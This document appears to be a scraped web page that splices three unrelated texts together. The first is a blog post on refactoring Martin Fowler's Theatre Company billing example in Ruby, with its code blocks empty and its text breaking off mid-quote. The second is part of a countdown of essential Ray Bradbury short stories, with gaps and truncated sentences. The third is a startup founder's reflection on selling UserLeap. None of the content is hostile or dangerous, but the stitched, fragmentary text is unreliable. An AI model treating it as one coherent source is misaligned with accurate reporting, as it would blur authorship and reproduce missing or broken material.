<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>June 30, 2020<!-- --> <!-- -->•<!-- --> <span>programming</span></p></header><section><p>I picked up <a href="https://martinfowler.com/books/refactoring.html">Refactoring, by Martin Fowler</a>, and I am learning a lot. The book is written like a catalogue that you can refer back to later. And, for those who are seeking, <strong>the book is an excellent chance to get your code reviewed by Martin Fowler!!</strong> 😮</p>
<p>Martin starts the book with an example that he goes on to refactor in the first chapter. Sensing an insane opportunity, I stopped right away and copied this original code in Ruby. I then went ahead, wrote down my thoughts and refactored the code like I would if it was an actual thing I was working on. Once I was done, I went back to the book and compared Martin’s notes against mine, and learnt from his thought process and code. I think this is the best way to read this chapter.</p>
<p>If you are someone who enjoys this, I highly recommend you give this a try too. And if not the book, use this blog to power your review.</p>

<p><strong><em>(Psssst… You can find the full original code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/original">Github</a>)</em></strong></p>
<p>We have a Theatre Company that perform plays in events. They charge customers based on the type of the play, and also provide a “Volume Credit” for future discounts. The Company stores data about their plays (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/plays.json">plays.json</a>) and bills (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/invoices.json">invoices.json</a>) in JSON files.</p>
<p>The simple code below is used to print a bill from an invoice. This is the code we will attempt to refactor. Assume that this code is part of a much larger system and we are refactoring while adding a feature to print bills in HTML. Moreover, the Company has plans to perform more types of plays in the future.</p>

<p><strong><em>(Psssst… You can find the refactored code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/ketanbhatt">Github</a>)</em></strong></p>
<p>Reading through the code, this is what stood out for me:</p>
<ol>
<li>The <code>statement</code> method returns a formatted text right now. I would like it to return a structured statement that I can format later as I wish, for example: for sending Slack notifications, emails. Additionally, it simplifies writing tests for this and the formatter methods.</li>
<li>The code that adds extra <code>volume_credits</code> for <code>comedy</code> plays, the comment states that we add extra credit for every “10” attendees, but the code adds a credit for every “5” attendees. Either this comment has gone stale, or there is a bug in the code. Either way, we can make the code more readable and remove the comment. (Aside: I like <a href="http://antirez.com/news/124">antirez’s blog about writing comments</a> a lot.)</li>
<li>Overall, it is difficult to understand what is going on in the code. I think we can make it more readable easily.</li>
<li>The method is doing too much, calculating <code>volume_credit</code> and <code>amount</code> for each type of play, and creating the text. It would be better if I can hand over this calculation to a different class that would do the needful, and my method just creates the text.</li>
<li>Because of this “doing too much”, the code has become messy. It will become still messier if the calculation was different for each Play too (and not same for Plays of the same type).</li>
<li>Also, looks like that the calculation is in cents and is being converted to dollars in the text. The code should make this explicit. Maybe I could rename the variable to be <code>amount_in_cents</code>?</li>
<li>The code right now assumes <code>audience</code> to be present and to be a number. Maybe we should put in validations that <code>asserts</code> for this truth? Although it seems out of scope for our current exercise.</li>
</ol>

<p>I moved the code for calculating amount and volume credits to a different class and file. I also separated the calculation for the two types of plays.</p>
<p>In the future, adding new play types will just need a new class to be added.</p>
<div data-language="ruby"><pre><code>

<br>
I also implemented the calculation in a more verbose manner. I think this improves the readability of the code.

I will call the refactoring done at this point.
<div><p>Although, I can’t seem to shake off this feeling that there is something more that can be done. I don’t think I am completely happy with the changes 😕 Let’s see what Sir Martin has to say.
</p></div>
<center>
<p><img src="https://media.giphy.com/media/vA4EnqvJxDv2g/giphy.gif" alt="Excited Anticipation GIF"></p>
</center>

<p>The process that Martin followed for refactoring the original code, in his words, was:</p>
<blockquote>
<ol>
<li>Decomposing the original function into a set of nested functions</li>
<li>Separate calculating and printing code, the two phases.</li>
<li>Introducing a polymorphic calculator for the calculation logic.</li>
</ol>
</blockquote>

<p>From what I have learnt in this chapter, in the <strong>hypothetical scenario</strong> in which Martin Fowler does a code review of my changes, this is what he would have to say:</p>
<ol>
<li><em>“I like that you are using an intermediate structure to pass the calculation …</em></li></ol></section></article></div>

</div></div><div data-block-type="2" id="block-32e240a0acc2fe970f20"><div><p>When the first edition of <em>Listen to the Echoes: The Ray Bradbury Interviews </em>was published in June of 2010, I embarked upon an overly-ambitious project. I began a series on my blog titled “The Essential Bradbury,” where I intended on listing the 25 must-read Ray Bradbury short stories for any would-be Martian-neophytes. I listed out each story, its history, themes, and what made the tale top-shelf Bradbury. Over the next few years, I made it all the way to 18 stories! But, then, the old web site came down as <a href="https://hatandbeard.com/products/listen-to-the-echoes-the-ray-bradbury-interviews"><em>Listen to the Echoes</em></a> was published in a handsome new edition by a new publisher and, alas, I never completed the 25 “Essential Bradbury” stories.</p><p>So here I go again! Fans have been writing me, asking if I would re-post the old story suggestions and, at long last, finish the project. And so it begins. I figure I only have seven more stories to write about! I have reordered many of my choices. I will be counting down from 25 to number 1 over the next few weeks. </p><p>People often ask, "where should I begin when it comes to reading Bradbury?"</p><p>The long answer? In 2010, Everyman's Library republished <a href="https://www.amazon.com/Stories-Bradbury-Everymans-Contemporary-Classics/dp/0307269051/ref=sr_1_1?ie=UTF8&amp;qid=1543608624&amp;sr=8-1&amp;keywords=the+stories+of+ray+bradbury"><em>The Stories of Ray Bradbury</em></a><em> </em>containing a staggering 100 of Bradbury's best short stories. Along with this, there is the equally voluminous <a href="https://www.amazon.com/Bradbury-Stories-Most-Celebrated-Tales/dp/0060544880/ref=sr_1_1?ie=UTF8&amp;qid=1543608705&amp;sr=8-1&amp;keywords=bradbury+stories"><em>Bradbury Stories</em></a>, published in 2003, containing&nbsp;yet another 100 more short fictional gems. (Bradbury dedicated this last book, in part to me, an incredible, stirring gift.) Certainly, you cannot go wrong by reading either of these spectacular volumes. Bradbury is a master of the short story.&nbsp; It is, in my estimation, his strongest creative form. His wife of 56 years, Marguerite, agreed with me. Yet reading 200 stories is, for many, an unrealistic goal.</p><div><p>So the short answer of where to begin with Bradbury is this list, right here. I will offer up a streamlined list of 25 of my own personal favorite short fictions by the master of miracles. These stories will embody all the trademarks of vintage Bradbury: the lyrical language; the fantastic, original, and memorable ideas; the rich metaphor; and endings that sometimes surprise, sometimes sadden, always instruct and entertain. This list will be entirely subjective. These are my favorites. They will reflect a wide range, from weird tales to social science fiction to quiet and contemplative tales of contemporary literature. These tales are pure and classic Bradbury—our modern mythologist.</p><p><strong>#25 “THE FIRST NIGHT OF LENT”</strong></p></div><p><span>Where to Find It</span>: <em>A Medicine for Melancholy,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: <em>Playboy, March, 1956</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550443716450_14171"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1550443716450_17081"><div><p><span>Plot Synopsis</span>: A young screenwriter at work in Ireland in 1953 discovers that his ever-reliable regular taxicab driver has become dangerous and impaired when behind the wheel. Nick, the village driver, escorts the young writer from Dublin to the Irish countryside and the estate of the young screenwriter’s director. Nick then waits at the local pub until the writer is ready to be driven back to the city. There is never a problem, until the first night of Lent. . . .</p><p><span>Critique</span>: Any “essential” list of Bradbury short stories must include an Irish tale (as well as a Mexico story, a Mars story, and a Green Town story, for that matter). The problem is, of course, <em>which</em> Irish story? I choose this one for two simple reasons. First, Bradbury takes the lyrical quality of his voice and drenches it in a poetic and authentic Irish brogue.</p><p><em>Nick, now</em>. <em>See his easy hands loving the wheel in a slow clocklike turning as soft and silent as winter constellations snow down the sky. Listen to his mist-breathing voice all night-quiet as he charms the road, his foot a tenderly benevolent pat on the whispering accelerator, never a mile under thirty, never two miles over. Nick, Nick and his steady boat gentling a mild sweet lake where all Time slumbers. Look, compare. And bind such a man to you with summer grasses, gift him with silver, shake his hand warmly at each journey’s end</em></p><p><em>“Good night, Nick,” I said at the hotel. “See you tomorrow.”</em></p><p><em>“God willing,” whispered Nick</em></p><p><em>And he drove softly away.</em></p><p>The second reason I have selected this story for “The Essential Bradbury” list is that this is the first Irish story Bradbury wrote. It is his first creation, fresh-removed and newly-minted from his own actual experiences of living in Dublin in the autumn of 1953 and the winter of 1954, writing the screenplay for <em>Moby Dick</em> for film director John Huston. From a biographical standpoint, it is fascinating to read a work of short fiction that is, ostensibly, memoir. And with “The First Night of Lent,” Bradbury had discovered a trove of material that would continue to yield rich story, culminating in the publication of the 1992 semi-autobiographical novel, <em>Green Shadow, White Whale</em>, a minor-class</p><p><span>The Beginning of the Irish Stories</span>: As Ray recalled, one night after he had returned from Ireland, he was in bed and a voice spoke to him</p><p>“Ray, darling!”</p><p>Ray responded, “Who is it?” </p><p>And the voice said, “It’s Nick, the cab driver who drove you back and forth from Dublin to Kilcock 80 or 90 times. Do you remember that, Ray? Do you?” </p><p>And Ray said, “Yes?”</p><p>And the voice said, “Would you mind puttin’ it down?” </p><p>So Ray Bradbury started writing his Irish stories, beginning with “The First Night of Lent.”</p><p><span>Historical Aside</span>: A fascinating <em>New York Times </em>article on John Huston’s Georgian Irish Manor, ran June 12, 2012. Check it out <a href="http://www.nytimes.com/2012/06/15/greathomesanddestinations/15iht-reireland15.html">here</a>.</p><p>This is the very house where, in 1953, Nick the cab driver picked Bradbury up late at night, to drive him back to Dublin. This is the very house where Ray say with John Huston, late into the Irish night, as Huston went over Ray’s adaptation of <em>Moby Dick</em>.</p><p><strong>#24 “THE SOUND OF SUMMER RUNNING”</strong></p><p><span>Where to Find It</span>:<em> Dandelion Wine</em>, <em>The Stories of Ray Bradbury</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550446114005_16095"><div>

His shoes are worn out, his feet feel heavy, and he is convinced that this resplendent pair of Cream-Sponge Para Litefoot Shoes will change his summer forever.</p><p><span>Backstory</span>: Ray Bradbury on the origins of the story from <em>Listen to the Echoes: The Ray Bradbury Interviews</em>: </p><p>“I was on a bus going into Westwood a few years ago, and a young boy jumped on the bus, threw his money in the box, raced down the aisle, and threw himself into a seat across from me.&nbsp; And I looked at him, and I said, ‘My god, if I had his energy, I could write a poem every day, a story every week, a novel every month.&nbsp; What’s his secret?’&nbsp; I looked down at his feet.&nbsp; He had the brightest pair of new fresh tennis shoes on his feet.&nbsp; And I said, oh, my god, I can remember when I was a kid, my father taking me downtown and buying me my first pair of new summer tennis shoes.&nbsp; I went home, and I wrote the short story.”</p><p><span>Critique</span>: This story is a shining example of Bradbury’s range as a literary writer. The man did not need an otherworldly landscape or elements of the fantastic to meditate on the human experience. Bradbury found magic in the every day, in this case, in a new pair of tennis shoes and the perspective of youth. The best Bradbury, in my opinion, is rooted in unforgettable story with a philosophical question at its center, all told in his singular, poetic style.</p><p><span>The Prose</span>: <em>Somehow the people who made tennis shoes knew what boys needed and wanted. They put marshmallows and coiled springs in the soles and they wove the rest out of grasses bleached and fired in the wilderness. Somewhere deep in the soft loam of the shoes the thin hard sinews of the buck deer were hidden. The people that made the shoes must have watched a lot of winds blow the trees and a lot of rivers going down to the lakes. Whatever it was, it was in the shoes, and it was summer.</em></p><p><br> <strong>#23 “THE LONG RAIN”</strong></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1553888873530_11881"><div>

      <p>A fascinating pattern has started to emerge while growing UserLeap. </p><p>When I meet with a winning company and show them our product? Their eyes light up and they immediately get it.</p><p>The company is almost always a category leader, or quickly on its way. Often, their app is on my phone home screen. The press constantly writes about them. Customers rave about their product. Awards are the norm. Everyone knows who they are. I’m giddy just speaking with them. </p><p>But there’s no selling necessary. Budget is rarely an issue. I meet with them for 30 minutes and they move right into a trial. </p><p>The struggling companies? Their startup isn’t taking off. Growth has plateaued. The stock price is declining. Competitors are stealing customers.</p><p>When I meet with these companies it’s always a challenging conversation. They say there are other priorities. I realize it’ll be a long sales cycle. They rarely move forward. </p><p>Those winners? They’re winning because they understand their customer — and better than anyone else. Customer motivations. Inner fears. Challenges. Habits.</p><p>Their top priority is their customer. It was from day one. It's why they became successful. It’s why they’re winning today. It’s how they know they’ll continue to win—every day. UserLeap is the ideal solution that puts their customer first and drives customer-informed decision making across their company.</p><p>The struggling companies? Their customers are a priority tomorrow. Or next quarter. Or next year. Right now, something else is more important. Internal politics. A logo redesign. A press write up. An internal promotion. The next Forbes list. Our product offers little value to them. They say the budget is full. </p><p>I may never figure out how to sell to struggling companies. And that maybe that’s ok.</p>
